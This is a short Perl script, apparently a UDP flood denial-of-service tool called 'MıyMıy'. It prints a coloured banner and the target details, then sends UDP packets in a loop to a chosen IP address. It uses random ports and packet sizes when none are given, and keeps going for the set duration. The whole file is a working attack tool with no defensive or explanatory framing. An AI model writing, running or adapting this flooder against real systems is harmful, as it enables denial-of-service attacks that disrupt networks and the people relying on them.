#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##########
# MıyMıy #
##########

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

  __  __ _____   __   __  __ _____   __
 |  \/  |_ _\ \ / /__|  \/  |_ _\ \ / /
 | |\/| || | \ V /___| |\/| || | \ V / 
 |_|  |_|___| |_|    |_|  |_|___| |_|  
                                       	  



EOTEXT
print BOLD WHITE<<EOTEXT;
                    =================
                    =  Targets Info =
                    =================
                Ip Address = $ip
                
		Port = $port
                
		Time = $time
                
		Package = $size
EOTEXT
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
